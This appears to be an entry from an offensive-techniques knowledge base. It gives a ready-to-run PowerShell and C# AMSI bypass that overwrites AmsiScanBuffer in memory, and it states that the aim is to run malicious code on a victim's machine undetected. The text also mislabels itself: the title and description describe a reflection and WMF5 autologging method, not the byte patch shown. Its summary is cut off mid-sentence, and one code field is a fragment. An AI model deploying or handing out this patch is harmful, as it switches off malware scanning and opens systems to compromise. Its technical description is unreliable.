---
id: ef5334e4-af62-417a-83e8-348f33af2d3c
name: Reflection-based bypass of AMSI scanning with WMF5 autologging bypass
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.137888+00:00'
updated_at: '2023-04-10T20:36:18.642618+00:00'
tags:
- '[[Adam Chester Patch]]'
- '[[Using Matt Graebers Reflection method with WMF5 autologging bypass]]'
commands:
- '[[Patch AMSI]]'
---

# Reflection-based bypass of AMSI scanning with WMF5 autologging bypass

## Summary

This procedure describes how to use Matt Graebers Reflection method with WMF5 autologging bypass to evade AMSI scanning. The technique involves using the Windows Management Framework 5 (WMF5) autologging bypass to load a .NET assembly into a PowerShell session. The assembly then uses reflection to 

## Description

# Description

This procedure describes how to use Matt Graebers Reflection method with WMF5 autologging bypass to evade AMSI scanning. The technique involves using the Windows Management Framework 5 (WMF5) autologging bypass to load a .NET assembly into a PowerShell session. The assembly then uses reflection to call the AMSI bypass function, which allows the attacker to execute malicious code without being detected by AMSI. This technique can be used by attackers to bypass AMSI scanning and execute malicious code on a victim's machine.

This technique requires a good understanding of .NET assemblies, reflection, and PowerShell. It is a powerful technique that can be used to evade detection and execute malicious code on a victim's machine. However, it requires a high level of technical expertise and is not recommended for novice attackers. From a business perspective, this technique can be used to gain access to sensitive data and systems, which can result in financial loss and damage to reputation.

 

## Requirements

1. Access to a PowerShell session

1. Understanding of .NET assemblies, reflection, and PowerShell

 

## Defense

1. Regularly update and patch systems to prevent attackers from exploiting vulnerabilities

1. Implement strong authentication measures to prevent unauthorized access to systems

1. Use endpoint protection solutions that can detect and block malicious code

 

## Objectives

1. Bypass AMSI scanning

1. Execute malicious code on a victim's machine

 

# Instructions

1. This command patches the AMSI Scan Buffer by bypassing the Update.

 



**Code**: [[$Winpatch = @"
using System;
using System.Runtime.]]



> The `PatchAmsi` function is used to patch the AMSI Scan Buffer. This function loads the `amsi.dll` library, retrieves the address of the `AmsiScanBuffer` function, and then replaces the first few bytes of the function with a `jmp` instruction that skips over the AMSI check. The `it` function determines if the system is 64-bit or 32-bit and then calls the appropriate patch function. The `is64Bit` function checks if the system is 64-bit or not. The `Add-Type` command compiles the C# code and adds it to the PowerShell session.



**Command** ([[Patch AMSI]]):

```bash
$Winpatch = @"
using System;
using System.Runtime.InteropServices;

public class patch
{
    // https://twitter.com/_xpn_/status/1170852932650262530
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

    public static void it()
    {
        if (is64Bit())
            PatchAmsi(x64);
        else
            PatchAmsi(x86);
    }

    private static void PatchAmsi(byte[] patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("a" + "ms" + "i.dll");
            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length);
            Console.WriteLine("Patch Sucessfull");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type -TypeDefinition $Winpatch -Language CSharp
[patch]::it()
```



## Commands Used

- [[Patch AMSI]]

## Tags

- [[Adam Chester Patch]]
- [[Using Matt Graebers Reflection method with WMF5 autologging bypass]]


